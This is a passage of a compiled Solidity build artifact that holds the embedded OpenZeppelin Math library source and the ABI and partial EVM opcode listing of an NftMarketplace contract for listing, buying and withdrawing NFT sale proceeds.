Math.Rounding)":"infinite"}},"methodIdentifiers":{}},"metadata":"{\"compiler\":{\"version\":\"0.8.7+commit.e28d00a7\"},\"language\":\"Solidity\",\"output\":{\"abi\":[],\"devdoc\":{\"details\":\"Standard math utilities missing in the Solidity language.\",\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"@openzeppelin/contracts/utils/math/Math.sol\":\"Math\"},\"evmVersion\":\"london\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\",\"useLiteralContent\":true},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"@openzeppelin/contracts/utils/math/Math.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v4.8.0) (utils/math/Math.sol)\\n\\npragma solidity ^0.8.0;\\n\\n/**\\n * @dev Standard math utilities missing in the Solidity language.\\n */\\nlibrary Math {\\n    enum Rounding {\\n        Down, // Toward negative infinity\\n        Up, // Toward infinity\\n        Zero // Toward zero\\n    }\\n\\n    /**\\n     * @dev Returns the largest of two numbers.\\n     */\\n    function max(uint256 a, uint256 b) internal pure returns (uint256) {\\n        return a > b ? a : b;\\n    }\\n\\n    /**\\n     * @dev Returns the smallest of two numbers.\\n     */\\n    function min(uint256 a, uint256 b) internal pure returns (uint256) {\\n        return a < b ? a : b;\\n    }\\n\\n    /**\\n     * @dev Returns the average of two numbers. The result is rounded towards\\n     * zero.\\n     */\\n    function average(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // (a + b) / 2 can overflow.\\n        return (a & b) + (a ^ b) / 2;\\n    }\\n\\n    /**\\n     * @dev Returns the ceiling of the division of two numbers.\\n     *\\n     * This differs from standard division with `/` in that it rounds up instead\\n     * of rounding down.\\n     */\\n    function ceilDiv(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // (a + b - 1) / b can overflow on addition, so we distribute.\\n        return a == 0 ? 0 : (a - 1) / b + 1;\\n    }\\n\\n    /**\\n     * @notice Calculates floor(x * y / denominator) with full precision. Throws if result overflows a uint256 or denominator == 0\\n     * @dev Original credit to Remco Bloemen under MIT license (https://xn--2-umb.com/21/muldiv)\\n     * with further edits by Uniswap Labs also under MIT license.\\n     */\\n    function mulDiv(\\n        uint256 x,\\n        uint256 y,\\n        uint256 denominator\\n    ) internal pure returns (uint256 result) {\\n        unchecked {\\n            // 512-bit multiply [prod1 prod0] = x * y. Compute the product mod 2^256 and mod 2^256 - 1, then use\\n            // use the Chinese Remainder Theorem to reconstruct the 512 bit result. The result is stored in two 256\\n            // variables such that product = prod1 * 2^256 + prod0.\\n            uint256 prod0; // Least significant 256 bits of the product\\n            uint256 prod1; // Most significant 256 bits of the product\\n            assembly {\\n                let mm := mulmod(x, y, not(0))\\n                prod0 := mul(x, y)\\n                prod1 := sub(sub(mm, prod0), lt(mm, prod0))\\n            }\\n\\n            // Handle non-overflow cases, 256 by 256 division.\\n            if (prod1 == 0) {\\n                return prod0 / denominator;\\n            }\\n\\n            // Make sure the result is less than 2^256. Also prevents denominator == 0.\\n            require(denominator > prod1);\\n\\n            ///////////////////////////////////////////////\\n            // 512 by 256 division.\\n            ///////////////////////////////////////////////\\n\\n            // Make division exact by subtracting the remainder from [prod1 prod0].\\n            uint256 remainder;\\n            assembly {\\n                // Compute remainder using mulmod.\\n                remainder := mulmod(x, y, denominator)\\n\\n                // Subtract 256 bit number from 512 bit number.\\n                prod1 := sub(prod1, gt(remainder, prod0))\\n                prod0 := sub(prod0, remainder)\\n            }\\n\\n            // Factor powers of two out of denominator and compute largest power of two divisor of denominator. Always >= 1.\\n            // See https://cs.stackexchange.com/q/138556/92363.\\n\\n            // Does not overflow because the denominator cannot be zero at this stage in the function.\\n            uint256 twos = denominator & (~denominator + 1);\\n            assembly {\\n                // Divide denominator by twos.\\n                denominator := div(denominator, twos)\\n\\n                // Divide [prod1 prod0] by twos.\\n                prod0 := div(prod0, twos)\\n\\n                // Flip twos such that it is 2^256 / twos. If twos is zero, then it becomes one.\\n                twos := add(div(sub(0, twos), twos), 1)\\n            }\\n\\n            // Shift in bits from prod1 into prod0.\\n            prod0 |= prod1 * twos;\\n\\n            // Invert denominator mod 2^256. Now that denominator is an odd number, it has an inverse modulo 2^256 such\\n            // that denominator * inv = 1 mod 2^256. Compute the inverse by starting with a seed that is correct for\\n            // four bits. That is, denominator * inv = 1 mod 2^4.\\n            uint256 inverse = (3 * denominator) ^ 2;\\n\\n            // Use the Newton-Raphson iteration to improve the precision. Thanks to Hensel's lifting lemma, this also works\\n            // in modular arithmetic, doubling the correct bits in each step.\\n            inverse *= 2 - denominator * inverse; // inverse mod 2^8\\n            inverse *= 2 - denominator * inverse; // inverse mod 2^16\\n            inverse *= 2 - denominator * inverse; // inverse mod 2^32\\n            inverse *= 2 - denominator * inverse; // inverse mod 2^64\\n            inverse *= 2 - denominator * inverse; // inverse mod 2^128\\n            inverse *= 2 - denominator * inverse; // inverse mod 2^256\\n\\n            // Because the division is now exact we can divide by multiplying with the modular inverse of denominator.\\n            // This will give us the correct result modulo 2^256. Since the preconditions guarantee that the outcome is\\n            // less than 2^256, this is the final result. We don't need to compute the high bits of the result and prod1\\n            // is no longer required.\\n            result = prod0 * inverse;\\n            return result;\\n        }\\n    }\\n\\n    /**\\n     * @notice Calculates x * y / denominator with full precision, following the selected rounding direction.\\n     */\\n    function mulDiv(\\n        uint256 x,\\n        uint256 y,\\n        uint256 denominator,\\n        Rounding rounding\\n    ) internal pure returns (uint256) {\\n        uint256 result = mulDiv(x, y, denominator);\\n        if (rounding == Rounding.Up && mulmod(x, y, denominator) > 0) {\\n            result += 1;\\n        }\\n        return result;\\n    }\\n\\n    /**\\n     * @dev Returns the square root of a number. If the number is not a perfect square, the value is rounded down.\\n     *\\n     * Inspired by Henry S. Warren, Jr.'s \\\"Hacker's Delight\\\" (Chapter 11).\\n     */\\n    function sqrt(uint256 a) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n\\n        // For our first guess, we get the biggest power of 2 which is smaller than the square root of the target.\\n        //\\n        // We know that the \\\"msb\\\" (most significant bit) of our target number `a` is a power of 2 such that we have\\n        // `msb(a) <= a < 2*msb(a)`. This value can be written `msb(a)=2**k` with `k=log2(a)`.\\n        //\\n        // This can be rewritten `2**log2(a) <= a < 2**(log2(a) + 1)`\\n        // \\u2192 `sqrt(2**k) <= sqrt(a) < sqrt(2**(k+1))`\\n        // \\u2192 `2**(k/2) <= sqrt(a) < 2**((k+1)/2) <= 2**(k/2 + 1)`\\n        //\\n        // Consequently, `2**(log2(a) / 2)` is a good first approximation of `sqrt(a)` with at least 1 correct bit.\\n        uint256 result = 1 << (log2(a) >> 1);\\n\\n        // At this point `result` is an estimation with one bit of precision. We know the true value is a uint128,\\n        // since it is the square root of a uint256. Newton's method converges quadratically (precision doubles at\\n        // every iteration). We thus need at most 7 iteration to turn our partial result with one bit of precision\\n        // into the expected uint128 result.\\n        unchecked {\\n            result = (result + a / result) >> 1;\\n            result = (result + a / result) >> 1;\\n            result = (result + a / result) >> 1;\\n            result = (result + a / result) >> 1;\\n            result = (result + a / result) >> 1;\\n            result = (result + a / result) >> 1;\\n            result = (result + a / result) >> 1;\\n            return min(result, a / result);\\n        }\\n    }\\n\\n    /**\\n     * @notice Calculates sqrt(a), following the selected rounding direction.\\n     */\\n    function sqrt(uint256 a, Rounding rounding) internal pure returns (uint256) {\\n        unchecked {\\n            uint256 result = sqrt(a);\\n            return result + (rounding == Rounding.Up && result * result < a ? 1 : 0);\\n        }\\n    }\\n\\n    /**\\n     * @dev Return the log in base 2, rounded down, of a positive value.\\n     * Returns 0 if given 0.\\n     */\\n    function log2(uint256 value) internal pure returns (uint256) {\\n        uint256 result = 0;\\n        unchecked {\\n            if (value >> 128 > 0) {\\n                value >>= 128;\\n                result += 128;\\n            }\\n            if (value >> 64 > 0) {\\n                value >>= 64;\\n                result += 64;\\n            }\\n            if (value >> 32 > 0) {\\n                value >>= 32;\\n                result += 32;\\n            }\\n            if (value >> 16 > 0) {\\n                value >>= 16;\\n                result += 16;\\n            }\\n            if (value >> 8 > 0) {\\n                value >>= 8;\\n                result += 8;\\n            }\\n            if (value >> 4 > 0) {\\n                value >>= 4;\\n                result += 4;\\n            }\\n            if (value >> 2 > 0) {\\n                value >>= 2;\\n                result += 2;\\n            }\\n            if (value >> 1 > 0) {\\n                result += 1;\\n            }\\n        }\\n        return result;\\n    }\\n\\n    /**\\n     * @dev Return the log in base 2, following the selected rounding direction, of a positive value.\\n     * Returns 0 if given 0.\\n     */\\n    function log2(uint256 value, Rounding rounding) internal pure returns (uint256) {\\n        unchecked {\\n            uint256 result = log2(value);\\n            return result + (rounding == Rounding.Up && 1 << result < value ? 1 : 0);\\n        }\\n    }\\n\\n    /**\\n     * @dev Return the log in base 10, rounded down, of a positive value.\\n     * Returns 0 if given 0.\\n     */\\n    function log10(uint256 value) internal pure returns (uint256) {\\n        uint256 result = 0;\\n        unchecked {\\n            if (value >= 10**64) {\\n                value /= 10**64;\\n                result += 64;\\n            }\\n            if (value >= 10**32) {\\n                value /= 10**32;\\n                result += 32;\\n            }\\n            if (value >= 10**16) {\\n                value /= 10**16;\\n                result += 16;\\n            }\\n            if (value >= 10**8) {\\n                value /= 10**8;\\n                result += 8;\\n            }\\n            if (value >= 10**4) {\\n                value /= 10**4;\\n                result += 4;\\n            }\\n            if (value >= 10**2) {\\n                value /= 10**2;\\n                result += 2;\\n            }\\n            if (value >= 10**1) {\\n                result += 1;\\n            }\\n        }\\n        return result;\\n    }\\n\\n    /**\\n     * @dev Return the log in base 10, following the selected rounding direction, of a positive value.\\n     * Returns 0 if given 0.\\n     */\\n    function log10(uint256 value, Rounding rounding) internal pure returns (uint256) {\\n        unchecked {\\n            uint256 result = log10(value);\\n            return result + (rounding == Rounding.Up && 10**result < value ? 1 : 0);\\n        }\\n    }\\n\\n    /**\\n     * @dev Return the log in base 256, rounded down, of a positive value.\\n     * Returns 0 if given 0.\\n     *\\n     * Adding one to the result gives the number of pairs of hex symbols needed to represent `value` as a hex string.\\n     */\\n    function log256(uint256 value) internal pure returns (uint256) {\\n        uint256 result = 0;\\n        unchecked {\\n            if (value >> 128 > 0) {\\n                value >>= 128;\\n                result += 16;\\n            }\\n            if (value >> 64 > 0) {\\n                value >>= 64;\\n                result += 8;\\n            }\\n            if (value >> 32 > 0) {\\n                value >>= 32;\\n                result += 4;\\n            }\\n            if (value >> 16 > 0) {\\n                value >>= 16;\\n                result += 2;\\n            }\\n            if (value >> 8 > 0) {\\n                result += 1;\\n            }\\n        }\\n        return result;\\n    }\\n\\n    /**\\n     * @dev Return the log in base 10, following the selected rounding direction, of a positive value.\\n     * Returns 0 if given 0.\\n     */\\n    function log256(uint256 value, Rounding rounding) internal pure returns (uint256) {\\n        unchecked {\\n            uint256 result = log256(value);\\n            return result + (rounding == Rounding.Up && 1 << (result * 8) < value ? 1 : 0);\\n        }\\n    }\\n}\\n\",\"keccak256\":\"0xa1e8e83cd0087785df04ac79fb395d9f3684caeaf973d9e2c71caef723a3a5d6\",\"license\":\"MIT\"}},\"version\":1}","storageLayout":{"storage":[],"types":null},"userdoc":{"kind":"user","methods":{},"version":1}}},"contracts/NftMarketplace.sol":{"NftMarketplace":{"abi":[{"inputs":[{"internalType":"address","name":"nftAddress","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"AlreadyListed","type":"error"},{"inputs":[],"name":"NoProceeds","type":"error"},{"inputs":[],"name":"NotApprovedForMarketplace","type":"error"},{"inputs":[{"internalType":"address","name":"nftAddress","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"NotListed","type":"error"},{"inputs":[],"name":"NotOwner","type":"error"},{"inputs":[],"name":"PriceMustBeAboveZero","type":"error"},{"inputs":[{"internalType":"address","name":"nftAddress","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"},{"internalType":"uint256","name":"price","type":"uint256"}],"name":"PriceNotMet","type":"error"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"seller","type":"address"},{"indexed":true,"internalType":"address","name":"nftAddress","type":"address"},{"indexed":true,"internalType":"uint256","name":"tokenId","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"price","type":"uint256"}],"name":"ItemBought","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"seller","type":"address"},{"indexed":true,"internalType":"address","name":"nftAddress","type":"address"},{"indexed":true,"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"ItemCanceled","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"seller","type":"address"},{"indexed":true,"internalType":"address","name":"nftAddress","type":"address"},{"indexed":true,"internalType":"uint256","name":"tokenId","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"price","type":"uint256"}],"name":"ItemListed","type":"event"},{"inputs":[{"internalType":"address","name":"nftAddress","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"buyItem","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"address","name":"nftAddress","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"cancelListing","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"nftAddress","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"getListing","outputs":[{"components":[{"internalType":"uint256","name":"price","type":"uint256"},{"internalType":"address","name":"seller","type":"address"}],"internalType":"struct NftMarketplace.Listing","name":"","type":"tuple"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"seller","type":"address"}],"name":"getProceeds","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"nftAddress","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"},{"internalType":"uint256","name":"price","type":"uint256"}],"name":"listItem","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"nftAddress","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"},{"internalType":"uint256","name":"newPrice","type":"uint256"}],"name":"updateListing","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"withdrawProceeds","outputs":[],"stateMutability":"nonpayable","type":"function"}],"devdoc":{"kind":"dev","methods":{},"version":1},"evm":{"bytecode":{"functionDebugData":{"@_18":{"entryPoint":null,"id":18,"parameterSlots":0,"returnSlots":0}},"generatedSources":[],"linkReferences":{},"object":"","opcodes":"PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x0 DUP2 SWAP1 SSTORE POP PUSH2 0x17D8 DUP1 PUSH2 0x28 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x70 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x9038E693 GT PUSH2 0x4E JUMPI DUP1 PUSH4 0x9038E693 EQ PUSH2 0x118 JUMPI DUP1 PUSH4 0x9F37092A EQ PUSH2 0x12F JUMPI DUP1 PUSH4 0xB2DDEE06 EQ PUSH2 0x14B JUMPI DUP1 PUSH4 0xF772ADF1 EQ PUSH2 0x174 JUMPI PUSH2 0x70 JUMP JUMPDEST DUP1 PUSH4 0x30CFEDA9 EQ PUSH2 0x75 JUMPI DUP1 PUSH4 0x88700D1C EQ PUSH2 0xB2 JUMPI DUP1 PUSH4 0x89BFD38F EQ PUSH2 0xEF JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x81 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x9C PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x97 SWAP2 SWAP1 PUSH2 0x135A JUMP JUMPDEST PUSH2 0x19D JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0xA9 SWAP2 SWAP1 PUSH2 0x1622 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0xBE JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0xD9 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0xD4 SWAP2 SWAP1 PUSH2 0x13B4 JUMP JUMPDEST PUSH2 0x1E6 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0xE6 SWAP2 SWAP1 PUSH2 0x1607 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0xFB JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x116 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x111 SWAP2 SWAP1 PUSH2 0x13F4 JUMP JUMPDEST PUSH2 0x2B1 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x124 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x12D PUSH2 0x727 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x149 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x144 SWAP2 SWAP1 PUSH2 0x13B4 JUMP JUMPDEST PUSH2 0x89A JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x157 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x172 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x16D SWAP2 SWAP1 PUSH2 0x13B4 JUMP JUMPDEST PUSH2 0xC87 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x180 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x19B PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x196 SWAP2 SWAP1 PUSH2 0x13F4 JUMP JUMPDEST PUSH2 0xF76 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 PUSH1 0x2 PUSH1 0x0 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x1EE PUSH2 0x12EB JUMP JUMPDEST PUSH1 0x1 PUSH1 0x0 DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP4 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE SWAP1 DUP2 PUSH1 0x0 DUP3 ADD SLOAD DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x1 DUP3 ADD PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE POP POP SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST DUP3 DUP3 PUSH1 0x0 PUSH1 0x1 PUSH1 0x0 DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP4 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE SWAP1 DUP2 PUSH1 0x0 DUP3 ADD SLOAD DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x1 DUP3 ADD PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE POP POP SWAP1 POP PUSH1 0x0 DUP2 PUSH1 0x0 ADD MLOAD GT ISZERO PUSH2 0x3BE JUMPI DUP3 DUP3 PUSH1 0x40 MLOAD PUSH32 0x4A5568D500000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x3B5 SWAP3 SWAP2 SWAP1 PUSH2 0x1567 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST DUP6 DUP6 CALLER PUSH1 0x0 DUP4 SWAP1 POP PUSH1 0x0 DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x6352211E DUP6 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x401 SWAP2 SWAP1 PUSH2 0x1622 JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x419 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x42D JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x451 SWAP2 SWAP1 PUSH2 0x1387 JUMP JUMPDEST SWAP1 POP DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH2 0x4B8 JUMPI PUSH1 0x40 MLOAD PUSH32 0x30CD747100000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 DUP10 GT PUSH2 0x4F2 JUMPI PUSH1 0x40 MLOAD PUSH32 0xE1ABBFC500000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 DUP12 SWAP1 POP ADDRESS PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x81812FC DUP14 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x547 SWAP2 SWAP1 PUSH2 0x1622 JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x55F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x573 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x597 SWAP2 SWAP1 PUSH2 0x1387 JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH2 0x5E4 JUMPI PUSH1 0x40 MLOAD PUSH32 0x4BE3A2C500000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 DUP12 DUP2 MSTORE PUSH1 0x20 ADD CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE POP PUSH1 0x1 PUSH1 0x0 DUP15 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP14 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP3 ADD MLOAD DUP2 PUSH1 0x0 ADD SSTORE PUSH1 0x20 DUP3 ADD MLOAD DUP2 PUSH1 0x1 ADD PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP SWAP1 POP POP DUP11 DUP13 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0xD547E933094F12A9159076970143EBE73234E64480317844B0DCB36117116DE4 DUP14 PUSH1 0x40 MLOAD PUSH2 0x711 SWAP2 SWAP1 PUSH2 0x1622 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG4 POP POP POP POP POP POP POP POP POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x2 PUSH1 0x0 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD SWAP1 POP PUSH1 0x0 DUP2 GT PUSH2 0x7A5 JUMPI PUSH1 0x40 MLOAD PUSH32 0xC4D8FA8700000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH1 0x2 PUSH1 0x0 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 DUP2 SWAP1 SSTORE POP PUSH1 0x0 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP3 PUSH1 0x40 MLOAD PUSH2 0x810 SWAP1 PUSH2 0x151B JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP8 GAS CALL SWAP3 POP POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0x84D JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 